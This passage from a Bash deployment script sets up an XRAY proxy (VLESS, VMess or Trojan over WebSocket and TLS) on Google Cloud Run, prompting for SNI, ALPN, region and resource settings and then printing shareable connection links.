  fi
else
  # If SERVICE was already provided, keep it but warn about retry behavior
  if [ $ATTEMPT_NUMBER -gt 1 ]; then
    NEW_SERVICE="${SERVICE}-retry${ATTEMPT_NUMBER}"
    SERVICE="$NEW_SERVICE"
    print_warning "Retry attempt $ATTEMPT_NUMBER - using modified service name: ${SERVICE}"
  fi
fi

CURRENT_SERVICE="$SERVICE"  # Store for cleanup if error occurs

# Validate service name format
if ! [[ "$SERVICE" =~ ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$ ]]; then
  print_error "Invalid service name. Use lowercase alphanumeric and hyphens only (1-63 chars)."
  exit 1
fi
print_success "Service name: $SERVICE"

# -------- Optional Link Parameters --------
if [ "${INTERACTIVE}" = true ] && [ -z "${SNI_CHOICE:-}" ]; then
  # Use preset SNI if available, otherwise ask
  if [ -z "${PRESET_SNI:-}" ]; then
    print_section "Advanced Settings (Optional)"
    echo ""
    echo -e "  ${BOLD}1${NC} yt3.ggpht.com    (YouTube CDN - Recommended)"
    echo -e "  ${BOLD}2${NC} www.google.com   (Google CDN)"
    echo -e "  ${BOLD}3${NC} m.youtube.com  (YouTube Direct)"
    echo -e "  ${BOLD}4${NC} ${GRAY}(Leave blank)${NC}     No SNI"
    echo ""
    read -rp "$(echo -e "${BOLD}Select SNI [1-4]${NC} (default: 4): ")
 " SNI_CHOICE
  else
    SNI_CHOICE="5"  # Use value that skips to preset
  fi
fi
SNI_CHOICE="${SNI_CHOICE:-4}"

case "$SNI_CHOICE" in
  1)
    SNI="yt3.ggpht.com"
    print_success "SNI: $SNI"
    ;;
  2)
    SNI="www.google.com"
    print_success "SNI: $SNI"
    ;;
  3)
    SNI="m.youtube.com"
    print_success "SNI: $SNI"
    ;;
  4)
    SNI=""
    print_info "No SNI selected"
    ;;
  5)
    SNI="${PRESET_SNI}"  # Use preset SNI
    [ -n "$SNI" ] && print_success "SNI (preset): $SNI" || print_info "No SNI (preset)"
    ;;
  *)
    SNI="$SNI_CHOICE"
    print_success "Custom SNI: $SNI"
    ;;
esac

# -------- ALPN --------
if [ "${INTERACTIVE}" = true ] && [ -z "${ALPN:-}" ]; then
  # Use preset ALPN if available, otherwise ask
  if [ -z "${PRESET_ALPN:-}" ]; then
    echo ""
    echo -e "  ${BOLD}1${NC} default          (h2, http/1.1)"
    echo -e "  ${BOLD}2${NC} h2,http/1.1      (HTTP/2 Priority)"
    echo -e "  ${BOLD}3${NC} h2               (HTTP/2 Only)"
    echo -e "  ${BOLD}4${NC} http/1.1         (HTTP/1.1 Only)"
    echo ""
    read -rp "$(echo -e "${BOLD}Select ALPN [1-4]${NC} (default: 1): ")
 " ALPN_CHOICE
  else
    ALPN_CHOICE="5"  # Use value that skips to preset
  fi
fi
ALPN_CHOICE="${ALPN_CHOICE:-1}"

case "$ALPN_CHOICE" in
  1)
    ALPN="default"
    print_success "ALPN: default"
    ;;
  2)
    ALPN="h2,http/1.1"
    print_success "ALPN: h2,http/1.1"
    ;;
  3)
    ALPN="h2"
    print_success "ALPN: h2"
    ;;
  4)
    ALPN="http/1.1"
    print_success "ALPN: http/1.1"
    ;;
  5)
    ALPN="${PRESET_ALPN}"  # Use preset ALPN
    print_success "ALPN (preset): $ALPN"
    ;;
  *)
    print_error "Invalid ALPN selection"
    exit 1
    ;;
esac

# Use region name as the default identifier for links
# CUSTOM_ID is set after region selection to the chosen region
CUSTOM_ID=""

# -------- UUID --------
UUID=$(cat /proc/sys/kernel/random/uuid)

# -------- Detect Available Cloud Run Regions --------
# Safe dry-run region check with results caching
# This implementation uses parallel checks and stores results in a cache file

CACHE_FILE="region_scan_results.txt"

# خريطة الرموز إلى الدولة / المنطقة
declare -A REGION_COUNTRY_MAP=(
  ["us-central1"]="United States - Iowa"
  ["us-east1"]="United States - South Carolina"
  ["us-east4"]="United States - Northern Virginia"
  ["us-west1"]="United States - Oregon"
  ["europe-west1"]="Belgium"
  ["europe-west4"]="Netherlands"
)

# Advanced region check using org-policies (faster method)
check_region_via_org_policy() {
  local cache_file=$1
  
  # Get current project
  PROJECT_ID=$(gcloud config get-value project 2>/dev/null || true)
  if [ -z "$PROJECT_ID" ]; then
    print_warning "Cannot get project ID. Falling back to legacy method."
    return 1
  fi
  
  print_info "Attempting to fetch allowed regions via org-policies (faster method)..."
  
  # Attempt to describe org-policies for resource locations
  # (orgpolicy API should already be enabled by enable_required_apis function)
  OUTPUT=$(gcloud org-policies describe constraints/gcp.resourceLocations --project="$PROJECT_ID" --format=yaml 2>&1)
  
  # Check if the command failed
  if echo "$OUTPUT" | grep -qE "(ERROR|error|not found|No API)"; then
    print_warning "Org-policy constraints not available. Using legacy method."
    return 1
  fi
  
  # If we have output with allowedValues, parse it
  if echo "$OUTPUT" | grep -q "allowedValues"; then
    print_success "Org-policy data retrieved. Parsing allowed regions..."
    
    # Extract regions from the output
    # Looking for entries like "in:us-central1-locations" or similar
    REGIONS=$(echo "$OUTPUT" | grep -oP "in:[a-z0-9\-]+\-locations" | sed 's/in://g' | sed 's/-locations//g' | grep -vE '^(aws|azure)$' | sort | uniq)
    
    if [ -n "$REGIONS" ]; then
      # Store results in cache
      while IFS= read -r region; do
        if [ -n "$region" ]; then
          echo "[${region}] ALLOWED (via org-policy)" >> "$cache_file"
        fi
      done <<< "$REGIONS"
      
      print_success "Successfully parsed regions from org-policies"
      return 0
    fi
  fi
  
  print_warning "No allowed values found in org-policy. Using legacy method."
  return 1
}

detect_available_regions() {
  print_info "🔍 Scanning Cloud Run region availability..."
  echo ""
  
  # Check if gcloud is installed and user is authenticated
  if ! command -v gcloud >/dev/null 2>&1; then
    print_warning "gcloud CLI not found. Using REGION_COUNTRY_MAP as default regions."
    for r in "${!REGION_COUNTRY_MAP[@]}"; do
      echo "__REGION:__$r"
    done
    return 0
  fi
  # Fast path: get regions that Cloud Run supports in this account/location
  GCLOUD_REGIONS=$(gcloud run regions list --format="value(name)" 2>/dev/null || true)

  # Check if cache file exists and is recent (less than 24 hours old)
  if [ -f "$CACHE_FILE" ] && [ -r "$CACHE_FILE" ]; then
    local file_age=$((($(date +%s) - $(stat -f%m "$CACHE_FILE" 2>/dev/null || stat -c%Y "$CACHE_FILE" 2>/dev/null || echo 0))))
    if [ $file_age -lt 86400 ]; then
      print_info "Using cached region results (age: $(($file_age/3600))h)"
      # Read cached results with error handling using mapfile
      if grep -q "✅ ALLOWED" "$CACHE_FILE" 2>/dev/null; then
        mapfile -t cached_regions < <(grep "✅ ALLOWED" "$CACHE_FILE" 2>/dev/null | sed 's/\[\(.*\)\].*/\1/' | sort -u)
        if [ ${#cached_regions[@]} -gt 0 ]; then
          for region in "${cached_regions[@]}"; do
            [ -n "$region" ] && echo "__REGION:__$region"
          done
          return 0
        fi
      fi
    fi
  fi
  
  # Perform fresh scan - Try org-policy method first (faster)
  print_info "Attempting fast org-policy based region detection..."
  echo ""
  
  # Clear cache file
  > "$CACHE_FILE"
  
  # Try the advanced org-policy method first
  if check_region_via_org_policy "$CACHE_FILE"; then
    print_success "Successfully retrieved regions via org-policy (fast method)"
    echo ""
    # Parse and display results from cache
    if grep -q "ALLOWED" "$CACHE_FILE" 2>/dev/null; then
      echo "Available Cloud Run regions (from org-policy):"
      mapfile -t regions_list < <(grep "ALLOWED" "$CACHE_FILE" 2>/dev/null | sed 's/\[\(.*\)\].*/\1/' | sort -u)
      for region in "${regions_list[@]}"; do
        if [ -n "$region" ]; then
          echo "__REGION:__$region"
        fi
      done
      return 0
    fi
  fi
  
  # Fallback to predefined region list if org-policy method failed
  print_warning "Org-policy method unavailable or failed."
  print_info "Using predefined region list..."
  echo ""
  
  # Display regions from SUGGESTED_REGIONS and MORE_REGIONS with country names and flags
  echo -e "${BRIGHT_GREEN}${BOLD}Available European Regions:${NC}"
  for region in europe-west4 europe-west1 europe-west3 europe-west2 europe-central2 europe-north1 europe-north2 europe-southwest1 europe-west10 europe-west12 europe-west6 europe-west8 europe-west9; do
    region_name="$(get_region_name "$region")"
    echo -e "  ${GREEN}✓${NC} ${BOLD}$region${NC} (${CYAN}${region_name}${NC})"
    echo "__REGION:__$region"
  done
  
  echo ""
  echo -e "${BRIGHT_CYAN}${BOLD}Available US Regions:${NC}"
  for region in us-central1 us-east1 us-east4 us-west1; do
    region_name="$(get_region_name "$region")"
    echo -e "  ${GREEN}✓${NC} ${BOLD}$region${NC} (${CYAN}${region_name}${NC})"
    echo "__REGION:__$region"
  done
}

# Get available regions once
print_section "Detecting Available Cloud Run Regions"
echo ""
print_info "Detecting regions..."
echo ""

# Extract regions from output safely
FULL_OUTPUT=$(detect_available_regions)
mapfile -t AVAILABLE_REGIONS_ARRAY < <(echo "$FULL_OUTPUT" | grep "^__REGION:__" | sed 's/^__REGION:__//')

# Convert array to newline-separated string for easier filtering
AVAILABLE_REGIONS=$(printf '%s\n' "${AVAILABLE_REGIONS_ARRAY[@]}")

# Ensure we have regions available; if empty, use fallback
if [ -z "$AVAILABLE_REGIONS" ] || [ ${#AVAILABLE_REGIONS_ARRAY[@]} -eq 0 ]; then
  print_warning "No regions were detected. Using fallback regions from REGION_COUNTRY_MAP."
  mapfile -t AVAILABLE_REGIONS_ARRAY < <(printf '%s\n' "${!REGION_COUNTRY_MAP[@]}")
  AVAILABLE_REGIONS=$(printf '%s\n' "${AVAILABLE_REGIONS_ARRAY[@]}")
fi

# Create arrays of available regions for easier filtering
FILTERED_SUGGESTED=()
for r in "${SUGGESTED_REGIONS[@]}"; do
  if echo "$AVAILABLE_REGIONS" | grep -xq "$r"; then
    FILTERED_SUGGESTED+=("$r")
  fi
done

FILTERED_MORE=()
for r in "${MORE_REGIONS[@]}"; do
  if echo "$AVAILABLE_REGIONS" | grep -xq "$r"; then
    FILTERED_MORE+=("$r")
  fi
done

# If no suggested regions are available, use available regions as fallback
if [ ${#FILTERED_SUGGESTED[@]} -eq 0 ]; then
  mapfile -t FILTERED_SUGGESTED < <(printf '%s\n' "${AVAILABLE_REGIONS_ARRAY[@]}" | head -5)
fi

# Brief pause to let user see the completion message
sleep 1

# -------- Region Select --------
print_section "Select Cloud Run Region"

if [ "${INTERACTIVE}" = true ] && [ -z "${REGION:-}" ]; then
  SELECTED_REGION=""
  
  # Auto-select if only one region is available
  if [ ${#FILTERED_SUGGESTED[@]} -eq 1 ]; then
    SELECTED_REGION="${FILTERED_SUGGESTED[0]}"
    region_name="$(get_region_name "$SELECTED_REGION")"
    echo ""
    echo -e "${GREEN}✓ Auto-selected region: ${BOLD}$SELECTED_REGION${NC} ($region_name)"
    echo ""
  else
    # Multiple or no regions available
    while [ -z "${SELECTED_REGION}" ]; do
      i=0  # Reset counter at start of each loop iteration
      echo ""
      
      # Show available suggested regions only
      if [ ${#FILTERED_SUGGESTED[@]} -gt 0 ]; then
        echo -e "${BOLD}🌍 Available Suggested Regions:${NC}"
        echo ""
        i=1
        for r in "${FILTERED_SUGGESTED[@]}"; do
          region_name="$(get_region_name "$r")"
          printf "  ${BOLD}%2d${NC} ${GREEN}✓${NC} %s (%s)\n" "$i" "$r" "$region_name"
          ((i++))
        done
        echo ""
      else
        echo -e "${YELLOW}⚠ No suggested regions available${NC}"
        echo ""
      fi
      
      # Show "more regions" option
      next_idx=$((i))
      printf "  ${BOLD}%2d${NC} ${CYAN}📋 Show more regions${NC}\n" "$next_idx"
      echo ""
      read -rp "$(echo -e "${BOLD}Select region${NC} [1-$next_idx]: ")" REGION_IDX
      REGION_IDX="${REGION_IDX:-1}"
      
      if [[ ! "$REGION_IDX" =~ ^[0-9]+$ ]] || [ "$REGION_IDX" -lt 1 ] || [ "$REGION_IDX" -gt $next_idx ]; then
        print_error "Invalid region selection. Please try again."
        continue
      fi
      
      # Check if user selected "more"
      if [ "$REGION_IDX" -eq $next_idx ]; then
        echo ""
        echo -e "${BOLD}🌍 More Available Regions:${NC}"
        echo ""
        
        # Show SUGGESTED_REGIONS first (for quick access)
        if [ ${#FILTERED_SUGGESTED[@]} -gt 0 ]; then
          echo -e "${GREEN}✓ Suggested (quick access):${NC}"
          for i_idx in "${!FILTERED_SUGGESTED[@]}"; do
            r="${FILTERED_SUGGESTED[$i_idx]}"
            region_name="$(get_region_name "$r")"
            printf "  %2d ✓ %s (%s)\n" "$((i_idx + 1))" "$r" "$region_name"
          done
          echo ""
        fi
        
        # Then, display FILTERED_MORE (available tested)
        if [ ${#FILTERED_MORE[@]} -gt 0 ]; then
          echo -e "${GREEN}✓ Available (tested):${NC}"
          for i_idx in "${!FILTERED_MORE[@]}"; do
            r="${FILTERED_MORE[$i_idx]}"
            region_name="$(get_region_name "$r")"
            printf "  %2d ✓ %s (%s)\n" "$((${#FILTERED_SUGGESTED[@]} + i_idx + 1))" "$r" "$region_name"
          done
          echo ""
        fi
        
        # Then, display untested regions from MORE_REGIONS
        echo -e "${CYAN}? Untested regions (may be available):${NC}"
        untested_idx=$((${#FILTERED_SUGGESTED[@]} + ${#FILTERED_MORE[@]}))
        
        untested_count=0
        for r in "${MORE_REGIONS[@]}"; do
          if ! echo "$AVAILABLE_REGIONS" | grep -xq "$r"; then
            untested_count=$((untested_count + 1))
            printf "  %2d ? %s\n" "$((untested_idx + untested_count))" "$r"
          fi
        done
        
        if [ $untested_count -eq 0 ] && [ ${#FILTERED_MORE[@]} -eq 0 ] && [ ${#FILTERED_SUGGESTED[@]} -eq 0 ]; then
          print_error "❌ No additional regions available"
          continue
        fi
        
        echo ""
        max_more_idx=$((${#FILTERED_SUGGESTED[@]} + ${#FILTERED_MORE[@]} + untested_count))
        read -rp "$(echo -e "${BOLD}Select region${NC} [1-$max_more_idx] (default: 1): ")" MORE_REGION_IDX
        MORE_REGION_IDX="${MORE_REGION_IDX:-1}"
        
        if [[ ! "$MORE_REGION_IDX" =~ ^[0-9]+$ ]] || [ "$MORE_REGION_IDX" -lt 1 ] || [ "$MORE_REGION_IDX" -gt $max_more_idx ]; then
          print_error "Invalid region selection. Please try again."
          continue
        fi
        
        # Get the selected region
        if [ "$MORE_REGION_IDX" -le ${#FILTERED_SUGGESTED[@]} ]; then
          # Selected from FILTERED_SUGGESTED
          SELECTED_REGION="${FILTERED_SUGGESTED[$((MORE_REGION_IDX - 1))]}"
        elif [ "$MORE_REGION_IDX" -le $((${#FILTERED_SUGGESTED[@]} + ${#FILTERED_MORE[@]})) ]; then
          # Selected from FILTERED_MORE
          SELECTED_REGION="${FILTERED_MORE[$((MORE_REGION_IDX - ${#FILTERED_SUGGESTED[@]} - 1))]}"
        else
          # Selected from untested regions
          selected_untested_idx=$((MORE_REGION_IDX - ${#FILTERED_SUGGESTED[@]} - ${#FILTERED_MORE[@]} - 1))
          untested_count=0
          for r in "${MORE_REGIONS[@]}"; do
            if ! echo "$AVAILABLE_REGIONS" | grep -xq "$r"; then
              if [ $untested_count -eq $selected_untested_idx ]; then
                SELECTED_REGION="$r"
                break
              fi
              ((untested_count++))
            fi
          done
        fi
      else
        # Selected from suggested regions
        if [ $REGION_IDX -le ${#FILTERED_SUGGESTED[@]} ]; then
          SELECTED_REGION="${FILTERED_SUGGESTED[$((REGION_IDX-1))]}"
        else
          print_error "Invalid region selection."
          continue
        fi
      fi
    done
  fi
  
  REGION="$SELECTED_REGION"
  # set custom identifier to region name with country flag
  CUSTOM_ID="$(get_region_name "$REGION")"
fi
REGION="${REGION:-us-central1}"
print_success "Selected region: $REGION"

# -------- Performance Settings --------
print_section "Performance Configuration"

if [ "$PRESET_MODE" = "custom" ]; then
  echo -e "${GRAY}(Optional - press Enter to skip each field)${NC}"
else
  echo -e "${GRAY}Preset: ${BOLD}$PRESET_MODE${GRAY} (press Enter to keep)${NC}"
fi

echo ""

if [ "${INTERACTIVE}" = true ] && [ -z "${MEMORY:-}" ]; then
  read -rp "$(echo -e "${BOLD}💾 Memory (MB)${NC} [512/1024/2048]: ")" MEMORY
fi
MEMORY="${MEMORY:-}"

if [ "${INTERACTIVE}" = true ] && [ -z "${CPU:-}" ]; then
  read -rp "$(echo -e "${BOLD}⚙️  CPU cores${NC} [0.5/1/2]: ")" CPU
fi
CPU="${CPU:-}"

if [ "${INTERACTIVE}" = true ] && [ -z "${TIMEOUT:-}" ]; then
  read -rp "$(echo -e "${BOLD}⏱️  Timeout (seconds)${NC} [300/1800/3600]: ")" TIMEOUT
fi
TIMEOUT="${TIMEOUT:-}"

if [ "${INTERACTIVE}" = true ] && [ -z "${MAX_INSTANCES:-}" ]; then
  read -rp "$(echo -e "${BOLD}📊 Max instances${NC} [5/10/20/50]: ")" MAX_INSTANCES
fi
MAX_INSTANCES="${MAX_INSTANCES:-}"

if [ "${INTERACTIVE}" = true ] && [ -z "${CONCURRENCY:-}" ]; then
  read -rp "$(echo -e "${BOLD}🔗 Max concurrent requests${NC} [100/500/1000]: ")" CONCURRENCY
fi
CONCURRENCY="${CONCURRENCY:-}"

# Speed Limit: قيمة ثابتة (لا تؤثر حالياً على السرعة الفعلية)
SPEED_LIMIT="${SPEED_LIMIT:-0}"

# Show what was selected
echo ""
print_section "Configuration Summary"
echo ""
[ -n "${MEMORY}" ] && print_success "Memory: ${BOLD}${MEMORY}${NC} MB" || print_info "Memory: (Cloud Run default)"
[ -n "${CPU}" ] && print_success "CPU: ${BOLD}${CPU}${NC} cores" || print_info "CPU: (Cloud Run default)"
[ -n "${TIMEOUT}" ] && print_success "Timeout: ${BOLD}${TIMEOUT}${NC}s" || print_info "Timeout: (Cloud Run default)"
[ -n "${MAX_INSTANCES}" ] && print_success "Max instances: ${BOLD}${MAX_INSTANCES}${NC}" || print_info "Max instances: (Cloud Run default)"
[ -n "${CONCURRENCY}" ] && print_success "Max concurrency: ${BOLD}${CONCURRENCY}${NC}" || print_info "Max concurrency: (Cloud Run default)"

# -------- Sanity checks --------
print_section "Validation"

if ! command -v gcloud >/dev/null 2>&1; then
  print_error "gcloud CLI not found. Install and authenticate first."
  exit 1
fi
print_success "gcloud CLI found"

PROJECT=$(gcloud config get-value project 2>/dev/null || true)
if [ -z "${PROJECT:-}" ]; then
  print_error "No GCP project set. Run 'gcloud init' or 'gcloud config set project PROJECT_ID'."
  exit 1
fi
print_success "GCP Project: $PROJECT"
print_success "All required APIs are enabled"

# -------- Deploying XRAY to Cloud Run --------
print_section "Deploying XRAY to Cloud Run"
echo ""

# Get PROJECT_NUMBER early (needed for HOST env var)
PROJECT_NUMBER=$(gcloud projects describe $(gcloud config get-value project 2>/dev/null) --format="value(projectNumber)" 2>/dev/null)

# Build deploy command with optional parameters
DEPLOY_ARGS=(
  "--source" "."
  "--region" "$REGION"
  "--platform" "managed"
  "--allow-unauthenticated"
)

[ -n "${MEMORY}" ] && DEPLOY_ARGS+=("--memory" "${MEMORY}Mi")
[ -n "${CPU}" ] && DEPLOY_ARGS+=("--cpu" "${CPU}")
[ -n "${TIMEOUT}" ] && DEPLOY_ARGS+=("--timeout" "${TIMEOUT}")
[ -n "${MAX_INSTANCES}" ] && DEPLOY_ARGS+=("--max-instances" "${MAX_INSTANCES}")
[ -n "${CONCURRENCY}" ] && DEPLOY_ARGS+=("--concurrency" "${CONCURRENCY}")

# Speed limit is now configured interactively or via environment variable

# Use Cloud Run service URL as WebSocket host header
# Format: service-projectnumber.region.run.app
ENV_VARS="PROTO=${PROTO},USER_ID=${UUID},WS_PATH=${WSPATH},NETWORK=${NETWORK},SPEED_LIMIT=${SPEED_LIMIT},HOST=${SERVICE}-${PROJECT_NUMBER}.${REGION}.run.app"
[ -n "${BOT_TOKEN}" ] && ENV_VARS+=",BOT_TOKEN=${BOT_TOKEN}"
[ -n "${CHAT_ID}" ] && ENV_VARS+=",CHAT_ID=${CHAT_ID}"
ENV_VARS+=",NOTIFY_ADMIN_URL=${NOTIFY_ADMIN_URL},NOTIFY_ADMIN_KEY=${NOTIFY_ADMIN_KEY}"
DEPLOY_ARGS+=("--set-env-vars" "$ENV_VARS")
DEPLOY_ARGS+=("--quiet")

# -------- Deploy to Cloud Run with Error Handling --------
print_info "Deploying service: ${BRIGHT_CYAN}${SERVICE}${NC}"
print_info "Attempt: ${BRIGHT_YELLOW}$ATTEMPT_NUMBER${NC} of ${BRIGHT_YELLOW}$MAX_ATTEMPTS${NC}"
echo ""

# Temporarily disable 'set -e' to catch deployment errors properly
set +e
DEPLOY_ERROR=0
gcloud run deploy "$SERVICE" "${DEPLOY_ARGS[@]}" || DEPLOY_ERROR=$?
set -e

if [ $DEPLOY_ERROR -ne 0 ]; then
  print_error "Deployment failed for service: $SERVICE (exit code: $DEPLOY_ERROR)"
  print_warning "Attempting cleanup and retry..."
  
  # Trigger cleanup and retry via trap
  exit 1
fi

print_success "Service deployed successfully: ${BOLD}${SERVICE}${NC}"

# -------- Get URL and Host --------

# Use custom hostname if provided, otherwise use Cloud Run default
if [ -n "${CUSTOM_HOST}" ]; then
  HOST="${CUSTOM_HOST}"
  echo "Service URL: https://${HOST}"
  echo "✅ Using custom hostname: ${HOST}"
else
  HOST="${SERVICE}-${PROJECT_NUMBER}.${REGION}.run.app"
  echo "Service URL: https://${HOST}"
  echo "✅ Using Cloud Run default: ${HOST}"
fi

# -------- Get URL and Host --------

# Use custom hostname if provided, otherwise use Cloud Run default
if [ -n "${CUSTOM_HOST}" ]; then
  HOST="${CUSTOM_HOST}"
  echo "Service URL: https://${HOST}"
  print_success "Using custom hostname: ${HOST}"
else
  HOST="${SERVICE}-${PROJECT_NUMBER}.${REGION}.run.app"
  echo ""
  print_success "Service deployed successfully!"
  echo "Service URL: ${BOLD}https://${HOST}${NC}"
fi

# -------- Output --------
echo ""
echo -e "${BRIGHT_GREEN}${BOLD}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_GREEN}${BOLD}║${NC}                                                              ${BRIGHT_GREEN}${BOLD}║${NC}"
echo -e "${BRIGHT_GREEN}${BOLD}║${NC}              ✅ ${BRIGHT_WHITE}${BOLD}DEPLOYMENT SUCCESS${NC}               ${BRIGHT_GREEN}${BOLD}║${NC}"
echo -e "${BRIGHT_GREEN}${BOLD}║${NC}                                                              ${BRIGHT_GREEN}${BOLD}║${NC}"
echo -e "${BRIGHT_GREEN}${BOLD}╚════════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "  ${BRIGHT_MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${BOLD}${BRIGHT_CYAN}Protocol${NC}:       ${BRIGHT_GREEN}${PROTO^^}${NC}"
echo -e "  ${BOLD}${BRIGHT_CYAN}Address${NC}:       ${BRIGHT_CYAN}${HOST}${NC}"
echo -e "  ${BOLD}${BRIGHT_CYAN}Port${NC}:          ${BRIGHT_YELLOW}443${NC} ${DIM}(HTTPS)${NC}"
echo -e "  ${BOLD}${BRIGHT_CYAN}UUID/PWD${NC}:      ${BRIGHT_MAGENTA}${UUID}${NC}"

if [ "$NETWORK" = "ws" ]; then
  echo -e "  ${BOLD}${BRIGHT_CYAN}Path${NC}:          ${BRIGHT_BLUE}${WSPATH}${NC}"
elif [ "$NETWORK" = "grpc" ]; then
  echo -e "  ${BOLD}${BRIGHT_CYAN}Service${NC}:       ${BRIGHT_BLUE}${WSPATH}${NC}"
fi

echo -e "  ${BOLD}${BRIGHT_CYAN}Network${NC}:       ${BRIGHT_CYAN}${NETWORK_DISPLAY}${NC}"
echo -e "  ${BOLD}${BRIGHT_CYAN}Security${NC}:      ${BRIGHT_GREEN}TLS${NC} ${DIM}(Enabled)${NC}"

if [[ "${SPEED_LIMIT}" =~ ^[0-9]+$ ]]; then
  MBPS=$(awk "BEGIN{printf \"%.2f\", (${SPEED_LIMIT}*8)/1000}")
  echo -e "  ${BOLD}${BRIGHT_CYAN}Speed Limit${NC}:   ${BRIGHT_YELLOW}${SPEED_LIMIT} KB/s${NC} ${DIM}(~${MBPS} Mbps)${NC}"
else
  echo -e "  ${BOLD}${BRIGHT_CYAN}Speed Limit${NC}:   ${BRIGHT_YELLOW}${SPEED_LIMIT}${NC}"
fi

if [ -n "${MEMORY}${CPU}${TIMEOUT}${MAX_INSTANCES}${CONCURRENCY}" ]; then
  echo ""
  echo -e "  ${BRIGHT_MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "  ${BOLD}${BRIGHT_BLUE}⚙️  Configuration Applied${NC}:"
  [ -n "${MEMORY}" ] && echo -e "      ${DIM}├─${NC} Memory:        ${BRIGHT_GREEN}${MEMORY}${NC} MB"
  [ -n "${CPU}" ] && echo -e "      ${DIM}├─${NC} CPU:           ${BRIGHT_GREEN}${CPU}${NC} cores"
  [ -n "${TIMEOUT}" ] && echo -e "      ${DIM}├─${NC} Timeout:       ${BRIGHT_GREEN}${TIMEOUT}${NC}s"
  [ -n "${MAX_INSTANCES}" ] && echo -e "      ${DIM}├─${NC} Max Instances: ${BRIGHT_GREEN}${MAX_INSTANCES}${NC}"
  [ -n "${CONCURRENCY}" ] && echo -e "      ${DIM}└─${NC} Concurrency:   ${BRIGHT_GREEN}${CONCURRENCY}${NC} req/instance"
fi

echo ""
echo -e "${BRIGHT_CYAN}${BOLD}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_CYAN}${BOLD}║${NC}                                                              ${BRIGHT_CYAN}${BOLD}║${NC}"
echo -e "${BRIGHT_CYAN}${BOLD}║${NC}              📎 ${BRIGHT_WHITE}${BOLD}SHARED LINKS${NC}                    ${BRIGHT_CYAN}${BOLD}║${NC}"
echo -e "${BRIGHT_CYAN}${BOLD}║${NC}                                                              ${BRIGHT_CYAN}${BOLD}║${NC}"
echo -e "${BRIGHT_CYAN}${BOLD}╚════════════════════════════════════════════════════════════════╝${NC}"

# -------- Build Query Parameters --------
# Build query parameters for WebSocket (only supported on Cloud Run)
QUERY_PARAMS="type=ws&security=tls&path=${WSPATH}"
if [ -n "${SNI}" ]; then
  QUERY_PARAMS="${QUERY_PARAMS}&sni=${SNI}"
fi
if [ -n "${ALPN}" ]; then
  QUERY_PARAMS="${QUERY_PARAMS}&alpn=${ALPN}"
fi
# Add host parameter for WebSocket compatibility
QUERY_PARAMS="${QUERY_PARAMS}&host=${HOST}"

# Build fragment with custom ID
LINK_FRAGMENT="xray"
if [ -n "${CUSTOM_ID}" ]; then
  LINK_FRAGMENT="${CUSTOM_ID}"
fi

# -------- Generate Protocol Links --------
if [ "$PROTO" = "vless" ]; then
  VLESS_QUERY="${QUERY_PARAMS}"
  VLESS_LINK="vless://${UUID}@${HOST}:443?${VLESS_QUERY}#${LINK_FRAGMENT}"
  echo ""
  echo -e "${BRIGHT_CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "  ${BRIGHT_CYAN}${BOLD}VLESS Link:${NC}"
  echo -e "${BRIGHT_GREEN}${DIM}$VLESS_LINK${NC}"
  echo -e "${BRIGHT_CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  SHARE_LINK="$VLESS_LINK"
elif [ "$PROTO" = "vmess" ]; then
  VMESS_JSON=$(cat <<EOF
{
  "v": "2",
  "ps": "$SERVICE",
  "add": "$HOST",
  "port": "443",
  "id": "$UUID",
  "aid": "0",
  "net": "$NETWORK",
  "type": "none",
  "host": "$HOST",
  "path": "$WSPATH",
  "tls": "tls"
}
EOF
)
  if [ -n "${SNI}" ]; then
    VMESS_JSON=$(echo "$VMESS_JSON" | sed "s/}/,\"sni\":\"${SNI}\"}/")
  fi
  if [ -n "${ALPN}" ]; then
    VMESS_JSON=$(echo "$VMESS_JSON" | sed "s/}/,\"alpn\":\"${ALPN}\"}/")
  fi
  VMESS_LINK="vmess://$(echo "$VMESS_JSON" | base64 -w 0)"
  echo ""
  echo -e "${BRIGHT_MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "  ${BRIGHT_MAGENTA}${BOLD}VMESS Link:${NC}"
  echo -e "${BRIGHT_MAGENTA}${DIM}$VMESS_LINK${NC}"
  echo -e "${BRIGHT_MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  SHARE_LINK="$VMESS_LINK"
elif [ "$PROTO" = "trojan" ]; then
  TROJAN_LINK="trojan://${UUID}@${HOST}:443?${QUERY_PARAMS}#${LINK_FRAGMENT}"
  echo ""
  echo -e "${BRIGHT_RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "  ${BRIGHT_RED}${BOLD}TROJAN Link:${NC}"
  echo -e "  ${BRIGHT_RED}${DIM}$TROJAN_LINK${NC}"
  echo -e "  ${BRIGHT_RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  SHARE_LINK="$TROJAN_LINK"
fi

# -------- Build DarkTunnel Link --------
if [ "$PROTO" = "trojan" ]; then
  DARK_JSON="{\"type\":\"TROJAN\",\"name\":\"${CUSTOM_ID:-$SERVICE}\",\"trojanTunnelConfig\":{\"v2rayConfig\":{\"host\":\"${HOST}\",\"port\":443,\"uuid\":\"${UUID}\",\"transportNetwork\":\"Websocket\",\"serverNameIndication\":\"${SNI}\",\"wsPath\":\"${WSPATH}\",\"wsHeaderHost\":\"${HOST}\"}}}"
elif [ "$PROTO" = "vless" ]; then
